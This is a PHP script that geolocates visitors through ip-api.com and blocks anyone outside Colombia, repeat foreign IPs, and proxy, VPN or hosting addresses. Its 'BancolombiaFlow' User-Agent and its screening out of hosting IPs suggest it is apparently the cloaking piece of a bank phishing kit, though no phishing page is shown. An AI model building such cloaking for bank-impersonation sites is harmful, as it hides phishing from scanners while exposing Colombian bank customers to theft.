<?php
/**
 * ================================================================
 * API Geo — Geolocalización de IP y bloqueo por país
 * ================================================================
 * Detecta si la IP es de Colombia. Si no, registra y opcionalmente
 * redirige. Usa ip-api.com (gratuito, sin API key).
 * ================================================================
 */

session_start();
header('Content-Type: application/json; charset=utf-8');

function getClientIp(): string {
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ips = explode(',', $_SERVER[$key]);
            return trim($ips[0]);
        }
    }
    return '127.0.0.1';
}

function getIpInfo(string $ip): ?array {
    // Ignorar IPs locales
    if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0) {
        return ['countryCode' => 'CO', 'country' => 'Colombia', 'city' => 'Local'];
    }

    // Usar ip-api.com (gratuito, sin key)
    $url = "http://ip-api.com/json/{$ip}?fields=status,country,countryCode,regionName,city,isp,mobile,proxy,hosting";
    
    $ctx = stream_context_create([
        'http' => ['timeout' => 5, 'header' => 'User-Agent: BancolombiaFlow/1.0']
    ]);
    
    $response = @file_get_contents($url, false, $ctx);
    if (!$response) return null;
    
    $data = json_decode($response, true);
    if (!$data || $data['status'] !== 'success') return null;
    
    return [
        'countryCode' => $data['countryCode'] ?? 'XX',
        'country'     => $data['country'] ?? 'Desconocido',
        'region'      => $data['regionName'] ?? '',
        'city'        => $data['city'] ?? '',
        'isp'         => $data['isp'] ?? '',
        'mobile'      => $data['mobile'] ?? false,
        'proxy'       => $data['proxy'] ?? false,
        'hosting'     => $data['hosting'] ?? false
    ];
}

$ip = getClientIp();
$info = getIpInfo($ip);

if (!$info) {
    echo json_encode(['ok' => false, 'error' => 'No se pudo obtener información de geolocalización']);
    exit;
}

$isColombia = ($info['countryCode'] === 'CO');

// ── Registrar IP en sesión ──
$_SESSION['geo_ips'] = $_SESSION['geo_ips'] ?? [];
$_SESSION['geo_ips'][$ip] = [
    'countryCode' => $info['countryCode'],
    'country'     => $info['country'],
    'timestamp'   => time()
];

// ── Contar IPs extranjeras únicas ──
$foreignIps = array_filter($_SESSION['geo_ips'], fn($v) => $v['countryCode'] !== 'CO');
$foreignCount = count($foreignIps);

// ── Bloquear si es extranjero o si hay más de 2 IPs extranjeras ──
$blocked = false;
$reason = '';

if (!$isColombia) {
    $blocked = true;
    $reason = "IP extranjera detectada: {$info['country']} ({$ip})";
}
elseif ($foreignCount > 2) {
    $blocked = true;
    $reason = "Más de 2 IPs extranjeras detectadas ({$foreignCount})";
}
elseif ($info['proxy'] || $info['hosting']) {
    $blocked = true;
    $reason = "IP detectada como proxy/VPN/hosting";
}

echo json_encode([
    'ok'           => true,
    'ip'           => $ip,
    'countryCode'  => $info['countryCode'],
    'country'      => $info['country'],
    'city'         => $info['city'],
    'isColombia'   => $isColombia,
    'foreignCount' => $foreignCount,
    'blocked'      => $blocked,
    'reason'       => $reason
]);
